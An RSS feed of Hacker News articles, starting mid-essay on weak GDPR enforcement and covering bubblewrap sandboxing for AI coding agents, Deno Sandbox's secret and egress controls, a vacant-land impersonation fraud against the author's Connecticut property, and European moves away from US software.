the company, applied automatically when non-compliance is confirmed. No appeals on the fine itself, only on whether the violation occurred. Right now, the cost of ignoring a GDPR request from an individual is zero. That needs to change.</p><p><strong>Data protection offices need funding and accountability.</strong> An unanswered complaint is a failed complaint. If a regulatory body can't process reports in a reasonable timeframe, it's not regulating anything. There should be public reporting on resolution times and outcomes, so citizens can see whether their data protection office is actually functioning.</p><h2 id="nobody-cares-and-thats-the-problem">Nobody cares, and that's the problem</h2><p>The news occasionally reports that some S&amp;P 100 company got fined a few million for a data protection violation, and everyone cheers. That's the visible part. The invisible part is millions of individuals whose requests get ignored, discarded, or lost in bureaucratic limbo with no recourse.</p><p>Nobody checks whether companies actually comply. Nobody audits the small and mid-sized businesses. The enforcement agencies don't have the resources, and the EU doesn't seem interested in giving them more.</p><p>I'm sure I'm not alone in this. I'm convinced that GDPR rights are being violated at a massive scale, every single day, by companies of every size. But unless there's a headline-worthy fine to collect from a company with a trillion-dollar valuation, nobody cares.</p><p>The regulation exists. The enforcement doesn't.</p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sandboxing AI Agents in Linux (103 pts)]]></title>
            <link>https://blog.senko.net/sandboxing-ai-agents-in-linux</link>
            <guid>46874139</guid>
            <pubDate>Tue, 03 Feb 2026 17:35:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.senko.net/sandboxing-ai-agents-in-linux">https://blog.senko.net/sandboxing-ai-agents-in-linux</a>, See on <a href="https://news.ycombinator.com/item?id=46874139">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Like many developers, I find myself more and more using AI agents to help with software development.</p>

<p>I currently use Claude Code, the command line interface, together with Opus 4.5 (Anthropic's top model as of this writing). I use it to distill my rough task requirements into a detailed development plan, then implement the plan.</p>

<p>By default, Claude Code asks each time if it may read and write files and run software. This is sensible default configuration, but does get annoying after a time. Worse, it interrupts me often enough that I can't do much in parallel while babysitting it.</p>

<p>There's also a <code>--dangerously-skip-permissions</code> (a.k.a. “YOLO”) mode which will happily run anything without asking. This can be risky (although I know of some people that run it like that and still haven't destroyed their dev machines).</p>

<h2 id="sandboxing">Sandboxing</h2>

<p>The standard solution is to sandbox the agent – either on a remote machine (<a href="https://exe.dev/" rel="nofollow">exe.dev</a>, <a href="https://sprites.dev/" rel="nofollow">sprites.dev</a>, <a href="https://daytona.io/" rel="nofollow">daytona.io</a>), or locally via Docker or other virtualization mechanism.</p>

<p>A lightweight alternative on Linux is <a href="https://github.com/containers/bubblewrap" rel="nofollow">bubblewrap</a>, which uses Linux kernel features like cgroups and user namespaces to limit (jail) a process.</p>

<p>As it turns out, bubblewrap is a good solution for lightweight sandboxing of AI agents. Here's what I personally need from such a solution:</p>
<ul><li>mimic my regular Linux dev machine setup (I don't want to manage multiple dev environment)</li>
<li>minimal/no access to information outside what's required for the current project</li>
<li>write access only to the current project</li>
<li>can directly operate on the files/folders of the project so I can easily inspect or modify the same files from my IDE or run the code myself</li>
<li>network access – both to connect to AI providers and search the internet, and to be able to start a server that I can connect to</li></ul>

<p>Bubblewrap and Docker are not hardened security isolation mechanisms, but that's okay with me. I'm not really concerned about the following risks:</p>
<ul><li>escape via zero-day Linux kernel bug</li>
<li>covert side channel communications</li>
<li>exfiltration of data from current project (including project-specific access keys)</li>
<li>screwing up the codebase (the code is managed via <code>git</code> and backed up at GitHub or elsewhere)</li></ul>

<p>The last bit is tricky, but even full remote sandboxes can't protect against that. In theory, we could have transparent API proxies that would inject proper access keys without the AI agent ever being aware of it, but this is really non-trivial to set up right now.</p>

<p>An alternative is to contain potential damage by creating project-specific API keys so at least the blast area is minimal if those keys are leaked.</p>

<h2 id="in-practice">In practice</h2>

<p>Here's how my bubblewrap sandbox script looks:</p>

<pre><code>#!/usr/bin/bash

exec 3&lt;$HOME/.claude.json

exec /usr/bin/bwrap \
    --tmpfs /tmp \
    --dev /dev \
    --proc /proc \
    --hostname bubblewrap --unshare-uts \
    --ro-bind /bin /bin \
    --ro-bind /lib /lib \
    --ro-bind /lib32 /lib32 \
    --ro-bind /lib64 /lib64 \
    --ro-bind /usr/bin /usr/bin \
    --ro-bind /usr/lib /usr/lib \
    --ro-bind /usr/local/bin /usr/local/bin \
    --ro-bind /usr/local/lib /usr/local/lib \
    --ro-bind /opt/node/node-v22.11.0-linux-x64/ /opt/node/node-v22.11.0-linux-x64/ \
    --ro-bind /etc/alternatives /etc/alternatives \
    --ro-bind /etc/resolv.conf /etc/resolv.conf \
    --ro-bind /etc/profile.d /etc/profile.d \
    --ro-bind /etc/bash_completion.d /etc/bash_completion.d \
    --ro-bind /etc/ssl/certs /etc/ssl/certs \
    --ro-bind /etc/ld.so.cache /etc/ld.so.cache \
    --ro-bind /etc/ld.so.conf /etc/ld.so.conf \
    --ro-bind /etc/ld.so.conf.d /etc/ld.so.conf.d \
    --ro-bind /etc/localtime /etc/localtime \
    --ro-bind /usr/share/terminfo /usr/share/terminfo \
    --ro-bind /usr/share/ca-certificates /usr/share/ca-certificates \
    --ro-bind /etc/nsswitch.conf /etc/nsswitch.conf \
    --ro-bind /etc/hosts /etc/hosts \
    --ro-bind /etc/ssl/openssl.cnf /etc/ssl/openssl.cnf \
    --ro-bind /usr/share/zoneinfo /usr/share/zoneinfo \
    --ro-bind $HOME/.bashrc $HOME/.bashrc \
    --ro-bind $HOME/.profile $HOME/.profile \
    --ro-bind $HOME/.gitconfig $HOME/.gitconfig \
    --ro-bind $HOME/.local $HOME/.local \
    --bind $HOME/.claude $HOME/.claude \
    --bind $HOME/.cache $HOME/.cache \
    --file 3 $HOME/.claude.json \
    --bind "$PWD" "$PWD" \
    claude --dangerously-skip-permissions $@
</code></pre>

<p>If this looks rather idiosyncratic, it's because it is. Rather than using some generic rules, I experimented with <code>bwrap</code> until I found minimal configuration that I need to set up for my system.</p>

<p>Some interesting stuff:</p>
<ul><li><code>/tmp</code>, <code>/proc</code> and <code>/dev</code> are automatically handled by <code>bwrap</code></li>
<li>I bind-mount (ie. expose) files and directories under the same path as local machine, so there's no difference in file locations, project paths, etc</li>
<li>I don't expose entire <code>/etc</code>, just the bare minimum</li>
<li>The content of <code>$HOME/.claude.json</code> is injected into the sandbox so any changes there won't get saved to the real one</li>
<li>The content of <code>$HOME/.claude/</code> directory <em>is</em> mapped read-write, so Claude can save and modify files there (such as session data)</li>
<li><code>/opt/node/node-v22.11.0-linux-x64/</code> is my custom <code>nodejs</code> install location</li>
<li>I change the hostname so it's easy to distinguish between the host and sandbox</li></ul>

<p>I will probably be tweaking the script as needed, but this is a pretty good starting point for me.</p>

<h2 id="how-to-customize">How to customize</h2>

<p>If you want to adapt this to another AI agent or to your system, my suggestion is to tweak the script to run <code>bash</code> instead, then run your agent manually, see what breaks and tweak as appropriate.</p>

<p>A useful command for this is <code>strace</code>, which can trace file access system calls so you can see what's needed:</p>

<pre><code>strace -e trace=open,openat,stat,statx,access -o /tmp/strace.log codex
</code></pre>

<p>Inspecting the log you can spot which files are needed and bind them as needed.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Deno Sandbox (445 pts)]]></title>
            <link>https://deno.com/blog/introducing-deno-sandbox</link>
            <guid>46874097</guid>
            <pubDate>Tue, 03 Feb 2026 17:33:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://deno.com/blog/introducing-deno-sandbox">https://deno.com/blog/introducing-deno-sandbox</a>, See on <a href="https://news.ycombinator.com/item?id=46874097">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Over the past year, we’ve seen a shift in what Deno Deploy customers are
building: platforms where users generate code with LLMs, and that code runs
immediately without review. That code frequently calls LLMs itself, which means
it needs API keys and network access.</p>
<p>This isn’t the traditional “run untrusted plugins” problem. It’s deeper:
LLM-generated code, calling external APIs with real credentials, without human
review. Sandboxing the compute isn’t enough. You need to control network egress
and protect secrets from exfiltration.</p>
<p>Deno Sandbox provides both. And when the code is ready, you can deploy it
directly to Deno Deploy without rebuilding.</p>


<figure>

<lite-youtube videoid="u1ppsGMUUuo" videostartat="1243">
  <img slot="image" src="https://deno.com/sandboxes/video-thumbnail.webp">
</lite-youtube>

<figcaption>
Watch the full announcement video here.
</figcaption>
</figure>

<h2 id="sandboxes">Sandboxes?</h2>
<p>You don’t want to run untrusted code (generated by your LLMs, your users LLMs,
or even hand written by users) directly on your server. It will compromise your
system, steal your API keys, and call out to evil.com. You need isolation.</p>
<p>Deno Sandbox gives you lightweight Linux microVMs (running in the Deno Deploy
cloud) to run untrusted code with defense-in-depth security. You create or
programmatically via our JavaScript or Python SDKs, and they boot in under a
second. You can also interact with them via SSH, HTTP, or even open a VS Code
window directly into the sandbox.</p>
<div><pre><span>import</span> <span><span>{</span> <span>Sandbox</span> <span>}</span></span> <span>from</span> <span>"@deno/sandbox"</span><span>;</span>

<span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
<span>await</span> sandbox<span>.</span><span>sh</span><span><span>`</span><span>ls -lh /</span><span>`</span></span><span>;</span></pre></div><h2 id="secrets-that-cant-be-stolen">Secrets That Can’t Be Stolen</h2>
<p>But there is more. In Deno Sandbox, secrets never enter the environment. Code
sees only a placeholder:</p>
<div><pre><span>import</span> <span><span>{</span> <span>Sandbox</span> <span>}</span></span> <span>from</span> <span>"@deno/sandbox"</span><span>;</span>

<span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>{</span>
  secrets<span>:</span> <span>{</span>
    <span>OPENAI_API_KEY</span><span>:</span> <span>{</span>
      hosts<span>:</span> <span>[</span><span>"api.openai.com"</span><span>]</span><span>,</span>
      value<span>:</span> process<span>.</span><span>env</span><span>.</span><span>OPENAI_API_KEY</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>await</span> sandbox<span>.</span><span>sh</span><span><span>`</span><span>echo $OPENAI_API_KEY</span><span>`</span></span><span>;</span>
</pre></div><p>The real key materializes only when the sandbox makes an outbound request to an
approved host. If prompt-injected code tries to exfiltrate that placeholder to
<code>evil.com</code>? Useless.</p>
<h2 id="network-egress-control">Network Egress Control</h2>
<p>You can also restrict which hosts the sandbox can talk to:</p>
<div><pre><span>await</span> using sandbox <span>=</span> <span>await</span> <span>Sandbox</span><span>.</span><span>create</span><span>(</span><span>{</span>
  allowNet<span>:</span> <span>[</span><span>"api.openai.com"</span><span>,</span> <span>"*.anthropic.com"</span><span>]</span><span>,</span>
<span>}</span><span>)</span><span>;</span></pre></div><p>Any request to an unlisted host gets blocked at the VM boundary.</p>
<p>Both features are implemented via an outbound proxy similar to
<a href="https://github.com/coder/httpjail" rel="noopener noreferrer">coder/httpjail</a>. This gives us a chokepoint
for policy enforcement. We plan to add more capabilities here: analytics for
outbound connections and programmatic hooks for trusted code to inspect or
modify requests.</p>
<p>If you’re running untrusted JavaScript or TypeScript, combine this with Deno’s
<code>--allow-net</code> flag for defense in depth: VM-level network restrictions plus
runtime-level permissions.</p>
<h2 id="sandbox-to-production">Sandbox to Production</h2>
<p><code>sandbox.deploy()</code> deploys code from your sandbox directly to Deno Deploy.</p>
<div><pre><span>const</span> build <span>=</span> <span>await</span> sandbox<span>.</span><span>deploy</span><span>(</span><span>"my-app"</span><span>,</span> <span>{</span>
  production<span>:</span> <span>true</span><span>,</span>
  build<span>:</span> <span>{</span> mode<span>:</span> <span>"none"</span><span>,</span> entrypoint<span>:</span> <span>"server.ts"</span> <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>const</span> revision <span>=</span> <span>await</span> build<span>.</span><span>done</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>revision<span>.</span><span>url</span><span>)</span><span>;</span></pre></div><p>One call to go from sandbox to production deployment. No rebuilding in a
different CI system, no re-authenticating with a different tool. Just turn your
dev environment directly into a production ready, auto-scaling serverless
deployment.</p>
<h2 id="persistence">Persistence</h2>
<p>Sandboxes are ephemeral by default, but when you need state we have you covered:</p>
<ul>
<li><strong>Volumes</strong>: read-write storage for caches, databases, user data</li>
<li><strong>Snapshots</strong>: read-only images for pre-installed toolchains and volume base</li>
</ul>
<p>Run <code>apt-get install</code> once, snapshot it, and every future sandbox boots with
everything already installed. Create read-write volumes from the snapshots to
create a fresh development environment in seconds.</p>
<h2 id="technical-details">Technical Details</h2>
<div><table>
<thead>
<tr>
<th>Spec</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Regions</td>
<td>Amsterdam, Chicago</td>
</tr>
<tr>
<td>vCPUs</td>
<td>2</td>
</tr>
<tr>
<td>Memory</td>
<td>768 MB - 4 GB</td>
</tr>
<tr>
<td>Lifetime</td>
<td>Ephemeral or timeout (supports extending on demand)</td>
</tr>
<tr>
<td>Max lifetime</td>
<td>30 minutes</td>
</tr>
<tr>
<td>Boot time</td>
<td>&lt; 1 second</td>
</tr>
</tbody></table></div>
<p>Perfect for AI agents executing code, vibe-coding environments, secure plugin
systems, ephemeral CI runners, and customer-supplied code.</p>
<h2 id="pricing">Pricing</h2>
<p>Deno Sandbox is included in your Deno Deploy plan with competitive, usage-based
pricing. You pay for compute time, not wall-clock time.</p>
<ul>
<li><strong>$0.05/h</strong> CPU time (40h included with Pro)</li>
<li><strong>$0.016/GB-h</strong> memory (1000 GB-h included with Pro)</li>
<li><strong>$0.20/GiB-month</strong> volume storage (5 GiB included with Pro)</li>
</ul>
<p><a href="https://deno.com/deploy/pricing" rel="noopener noreferrer">See full pricing details →</a></p>
<p>Enterprise pricing available—contact <a href="mailto:deploy@deno.com" rel="noopener noreferrer">deploy@deno.com</a>.</p>
<h2 id="get-started">Get Started</h2>
<p>Deno Sandbox launches in beta today, alongside the
<a href="https://deno.com/blog/deno-deploy-is-ga" rel="noopener noreferrer">general availability of Deno Deploy</a>.</p>
<ul>
<li>Landing page: <a href="https://deno.com/sandbox" rel="noopener noreferrer">deno.com/sandbox</a></li>
<li>Docs: <a href="https://docs.deno.com/sandbox/" rel="noopener noreferrer">docs.deno.com/sandbox</a></li>
<li>JavaScript SDK: <a href="https://jsr.io/@deno/sandbox" rel="noopener noreferrer">jsr.io/@deno/sandbox</a> or
<a href="https://www.npmjs.com/package/@deno/sandbox" rel="noopener noreferrer">npm</a></li>
<li>Python SDK:
<a href="https://pypi.org/project/deno-sandbox/" rel="noopener noreferrer">pypi.org/project/deno-sandbox</a></li>
</ul>
<p>We’re excited to see what you (or your AI agents) build with Deno Sandbox.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[221 Cannon Road Is Not for Sale (254 pts)]]></title>
            <link>https://fredbenenson.com/blog/2026/02/03/221-cannon-is-not-for-sale/</link>
            <guid>46873574</guid>
            <pubDate>Tue, 03 Feb 2026 16:56:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fredbenenson.com/blog/2026/02/03/221-cannon-is-not-for-sale/">https://fredbenenson.com/blog/2026/02/03/221-cannon-is-not-for-sale/</a>, See on <a href="https://news.ycombinator.com/item?id=46873574">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Like most people, I’ve had my identity stolen once or twice in my life. It’s annoying, but thankfully I’ve avoided some of the more catastrophic outcomes when criminals begin impersonating you.</p><p>These days, however, it seems like someone is really trying to change that: a scammer has now tried to impersonate me multiple times in a six figure land deal in my hometown of Wilton, CT. So while I usually use this blog to write about finding weird things on the internet, it’s now time for a story about something weird on the internet finding me.</p><p>The story begins with my brother Alexander and I purchasing a small parcel of vacant land at 221 Cannon Road in Wilton, Connecticut in 2015. It’s been over 10 years since we purchased it and we have never listed it for sale. Nor do we have plans to sell it.</p><p>And yet, three different real estate agents have now contacted us to let us know that someone has been impersonating us and attempting to sell our property out from under us.</p><p>The first time it happened, it was pretty upsetting, but now that it’s happened another two times, I figured it was time to write a blog post about it.</p><h2>The First Attempt (March 2024)</h2><p>In March 2024, I received an email from a real estate attorney in Wilton, asking if I was the “Fred Benenson” who co-owned property in town with an “Ed Benenson.” He explained that a realtor at a major brokerage had been working with someone claiming to be us, and that there was already an offer on the table. The attorney was doing his due diligence before representing the sellers — and something didn’t add up.</p><p>I replied within minutes: Neither of us had spoken to anyone about selling the property. It was pretty concerning.</p><p>The realtor had been contacted through Zillow by someone claiming to be me. They’d had a phone conversation — she noted the person had a “middle European” accent — and the scammer had provided accurate details about the property, including its exact acreage. The impostor gave her the email address <code><a href="https://fredbenenson.com/cdn-cgi/l/email-protection" data-cfemail="b8decadddcddcad1dbd3daddd6ddd6cbd7d6f8dad1ded1ca96dbd7d5">[email&nbsp;protected]</a></code> and the phone number (516) 828-0305. He also provided a fake email for my brother: <code><a href="https://fredbenenson.com/cdn-cgi/l/email-protection" data-cfemail="1f7e737a677e717b7a6d7a7b687e6d7b7a717a716c70715f706a6b3273707074317c7072">[email&nbsp;protected]</a></code>. Notice the subtle misspelling — “Benenson” without the second “n” in the email, and the hyphenated “out-look.com” domain.</p><p>She had walked the property, taken drone photos, pulled comps, and listed for a price well above what we paid for it. The property had been live on dozens of real estate websites for days before anyone caught it. A builder had already submitted a full-price cash offer.</p><p>The scammer had even e-signed a purchase agreement.</p><p>When the attorney requested identification before closing, the impostor provided a New York State driver’s license. It had my father’s name (which I share with him) and his correct date of birth and home address. But the photo was of a complete stranger.</p><figure><img fetchpriority="high" decoding="async" width="787" height="1024" src="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722-787x1024.png" alt="" srcset="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722-787x1024.png 787w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722-230x300.png 230w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722-768x1000.png 768w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722-1180x1536.png 1180w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_1722.png 1286w" sizes="(max-width: 787px) 100vw, 787px"></figure><p>I have no idea who that guy is in on the license, but it’s definitely not my Dad. The license wouldn’t fool anyone who knew my father, but it didn’t need to – in a transaction conducted entirely by email and text message, with a closing that the scammer would never actually attend, the ID just needed to look plausible enough to keep things moving forward. (Though if you look closely at his signature, it’s clearly not written by hand.)</p><h2>How It Was Caught</h2><p>The attorney deserves most of the credit here. He told me this was the second time in nine months he’d encountered this exact scheme on vacant land in Wilton – his policy is that he won’t represent owners of vacant land without independently verifying ownership. That’s what led him to track me down, and that’s what stopped the sale.</p><p>The realtor was an innocent victim in this too. She’d done her job by walking the property, pulling comps, etc., all in good faith. When I initially suggested (perhaps unfairly) that this felt like lead generation, the attorney took me aside and vouched for her. I’m glad I listened to him!</p><p>I apologized to her, and she graciously forwarded me all of her text message exchanges with the scammer. Reading through them was fascinating. The impostor was responsive, polite, and generally knew the right things to say. But there were tells: slightly awkward phrasing (“Hi good morning”), declining a for-sale sign (“No I don’t think that will be necessary”), and a general reluctance to engage in any way that might require showing up in person.</p><figure><figure data-wp-context="{&quot;imageId&quot;:&quot;698226cf9b295&quot;}" data-wp-interactive="core/image" data-wp-key="698226cf9b295"><img decoding="async" width="472" height="1024" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" data-id="2350" src="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0173-472x1024.png" alt="" srcset="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0173-472x1024.png 472w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0173-138x300.png 138w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0173.png 590w" sizes="(max-width: 472px) 100vw, 472px"></figure><figure data-wp-context="{&quot;imageId&quot;:&quot;698226cf9b7e8&quot;}" data-wp-interactive="core/image" data-wp-key="698226cf9b7e8"><img decoding="async" width="472" height="1024" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" data-id="2351" src="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0174-472x1024.png" alt="" srcset="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0174-472x1024.png 472w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0174-138x300.png 138w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0174.png 590w" sizes="(max-width: 472px) 100vw, 472px"></figure><figure data-wp-context="{&quot;imageId&quot;:&quot;698226cf9bb41&quot;}" data-wp-interactive="core/image" data-wp-key="698226cf9bb41"><img loading="lazy" decoding="async" width="472" height="1024" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" data-id="2352" src="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0175-472x1024.png" alt="" srcset="https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0175-472x1024.png 472w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0175-138x300.png 138w, https://fredbenenson.com/wp-content/uploads/2026/02/IMG_0175.png 590w" sizes="auto, (max-width: 472px) 100vw, 472px"></figure></figure><h2>Going to the FBI</h2><p>After gathering everything I could — the fake ID, the realtor’s text messages, the scammer’s email addresses and phone number, and the attorney’s notes from a prior similar case — I contacted the FBI field office in Connecticut. They directed me to “walk it in” to the office in New York City.</p><p>The experience was, frankly, underwhelming. The FBI wouldn’t let me submit any of our documentation. Instead, they required me to write out the entire complaint by hand on a single piece of paper and hand it to the guard. He made some calls while I waited, and by the end he seemed at least somewhat interested. He gave me the standard line: 2-3 weeks if I hear from anyone.</p><p>I never heard from anyone.</p><p>The attorney, meanwhile, checked with his title company about recording an affidavit on the land records — something that would alert any future buyer or title searcher that the property had been targeted by fraud, and providing our verified contact information.</p><h2>It’s Happening Again (February 2026)</h2><p>I thought this was behind us. Then, this past week, nearly two years later, I was contacted by two more real estate agents, both reaching out to warn me that someone was once again trying to sell 221 Cannon Road.</p><p>The first was a agent in Wilton who reached out via Instagram DM, of all places — it was the only way he could find to contact me. He explained that his team had received an inquiry to list 221 Cannon Road and had sent paperwork to “Fred and Alex” the night before to sign. But he’d done something smart: he’d noticed he had a mutual friend with my brother, and when he asked him about the situation, he flagged that the conversation with “Alex” didn’t sound right.</p><p>“I had a really bad feeling it wasn’t,” he told me.</p><p>The second agent, a woman at Berkshire Hathaway, sent a carefully worded email explaining that she’d been contacted by someone claiming to have authority to sell our property, but that “several standard verification steps raised concerns” and she chose not to proceed. She reached out purely as a courtesy to let us know.</p><p>Which is about when I decided I should write something about this. Not only because it’s a fascinating scam that seems to be getting more common, but because I figured this post might show up for the next broker who might be doing research on the address.</p><h2>Vacant Land Fraud</h2><p>This type of scam targets a very specific vulnerability: vacant land has no occupants to notice a for-sale sign, no neighbors who’d immediately recognize something is wrong, and closings often happen remotely.</p><p>Here’s how it works:</p><ol><li>The scammer identifies vacant land through public records or Zillow. They look for parcels that are owned free and clear (no mortgage), haven’t changed hands recently, and are in desirable areas.</li><li>They contact a real estate agent through a platform like Zillow, posing as the owner. They know the property details because that information is publicly available.</li><li>They communicate primarily through text and email, avoiding in-person meetings. They provide fake identification if asked.</li><li>They agree to whatever price the agent suggests (because they don’t actually own the property, any sale is pure profit).</li><li>They push for a quick closing and attempt to direct proceeds to an account they control.</li><li>If questioned, they disappear. The scammer who targeted us in 2024 simply stopped responding once the attorney asked for an in-person closing.</li><li>If they get farther they’ll pocket the earnest money deposit which would have been significant in my case.</li></ol><p>A similar scheme in nearby Fairfield wasn’t caught in time: <a href="https://www.nbcnewyork.com/news/local/ct-property-sat-vacant-for-years-a-1-5m-home-was-built-on-it-without-owners-knowing/4573739/">someone had a $1.5 million home built on land they didn’t own</a> without the actual owners knowing.</p><h2>What You Can Do</h2><p>If you own vacant land there are a couple of things you can do, but the most effective one is probably to register the address with a Fraud / No-Authority notice. This involves calling the County Recorder / Register of Deeds and ask how to record one of these (names vary by state):<br>&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Owner Affidavit<br>&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Affidavit of Fact<br>&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Notice of Non-Authority to Convey<br>&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Fraud Alert / Title Alert Notice<br>&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Statement of Ownership / Anti-Fraud Notice:</p><p>You could also setup up Google Alerts for your address and you’ll be notified if it appears online.</p><p>Finally, and this certainly isn’t for everyone, you can make yourself easily findable online. One reason the attorney was able to verify ownership quickly in 2024 was that it’s fairly easy to gooogle me. If you own property, make sure there’s some way for a diligent attorney or agent to reach the real you.</p><h2>The Property Is Not For Sale</h2><p>In case it isn’t clear, 221 Cannon Road is not for sale. It has never been for sale. If you are a real estate professional who has been contacted about listing or purchasing this property, please reach out to me directly.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[France dumps Zoom and Teams as Europe seeks digital autonomy from the US (967 pts)]]></title>
            <link>https://apnews.com/article/europe-digital-sovereignty-big-tech-9f5388b68a0648514cebc8d92f682060</link>
            <guid>46873294</guid>
            <pubDate>Tue, 03 Feb 2026 16:39:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apnews.com/article/europe-digital-sovereignty-big-tech-9f5388b68a0648514cebc8d92f682060">https://apnews.com/article/europe-digital-sovereignty-big-tech-9f5388b68a0648514cebc8d92f682060</a>, See on <a href="https://news.ycombinator.com/item?id=46873294">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                        <p>LONDON (AP) — In France, civil servants will ditch Zoom and Teams for a homegrown video conference system. Soldiers in Austria are using open source office software to write reports after the military dropped Microsoft Office. Bureaucrats in a German state have also turned to free software for their administrative work. </p><p>Around Europe, governments and institutions are seeking to reduce their use of digital services from U.S. Big Tech companies and turning to domestic or free alternatives. The push for “digital sovereignty” is gaining attention as the Trump administration strikes an increasingly belligerent posture toward the continent, highlighted by recent tensions over <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/greenland-denmark-trump-china-nato-arctic-law-5d92b9439ffa9027598af4be695e6415">Greenland</a></span> that intensified fears that Silicon Valley giants could be compelled to cut off access. </p><p>Concerns about <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/data-privacy-cybersecurity-europe-us-7bfc7c2be54a81068b5b16dff32ed9c6">data privacy</a></span> and worries that Europe is not doing enough to keep up with the United States and Chinese tech leadership are also fueling the drive.</p>
    
<p>The French government referenced some of these concerns when it announced last week that 2.5 million civil servants would stop using video conference tools from U.S. providers — including Zoom, Microsoft Teams, Webex and GoTo Meeting — by 2027 and switch to Visio, a homegrown service.</p>



<p>The objective is “to put an end to the use of non-European solutions, to guarantee the security and confidentiality of public electronic communications by relying on a powerful and sovereign tool,” the announcement said. </p>
    
    
    
<p>“We cannot risk having our scientific exchanges, our sensitive data, and our strategic innovations exposed to non-European actors,” David Amiel, a civil service minister, said in a press release.</p><p>Microsoft said it continues to “partner closely with the government in France and respect the importance of security, privacy, and digital trust for public institutions.”</p><p>The company said it is “focused on providing customers with greater choice, stronger data protection, and resilient cloud services — ensuring data stays in Europe, under European law, with robust security and privacy protections.” </p>
    
<p>Zoom, Webex and GoTo Meeting did not respond to requests for comment. </p><p>French President Emmanuel Macron has been pushing digital sovereignty for years. But there’s now a lot more “political momentum behind this idea now that we need to de-risk from U.S. tech,” Nick Reiners, senior geotechnology analyst at the Eurasia Group. </p><p>“It feels kind of like there’s a real zeitgeist shift,” Reiners said</p><p>It was a hot topic at the World Economic Forum’s annual meeting of global political and business elites last month in <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/live/world-economic-forum-davos-updates-1-22-2026">Davos</a></span>, Switzerland. The European Commission’s official for tech sovereignty, Henna Virkkunen, told an audience that Europe’s reliance on others “can be weaponized against us.” </p><p>“That’s why it’s so important that we are not dependent on one country or one company when it comes to very critical fields of our economy or society,” she said, without naming countries or companies. </p><p>A decisive moment came last year when the Trump administration sanctioned the International Criminal Court’s top prosecutor after the tribunal, based in The Hague, Netherlands, issued an arrest warrant for Israeli Prime Minister Benjamin Netanyahu, an ally of President Donald Trump. </p>
    
<p>The sanctions led Microsoft to cancel Khan’s ICC email, a move that was <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/icc-trump-sanctions-karim-khan-court-a4b4c02751ab84c09718b1b95cbd5db3">first reported</a></span> by The Associated Press and sparked fears of a “kill switch” that Big Tech companies can use to turn off service at will. </p><p>Microsoft maintains it kept in touch with the ICC “throughout the process that resulted in the disconnection of its sanctioned official from Microsoft services. At no point did Microsoft cease or suspend its services to the ICC.”</p><p>Microsoft President Brad Smith has repeatedly sought to strengthen trans-Atlantic ties, the company’s press office said, and pointed to an interview he did last month with CNN in Davos in which he said that jobs, trade and investment. as well as security, would be affected by a rift over Greenland. </p><p>“Europe is the American tech sector’s biggest market after the United States itself. It all depends on trust. Trust requires dialogue,” Smith said. </p>
    
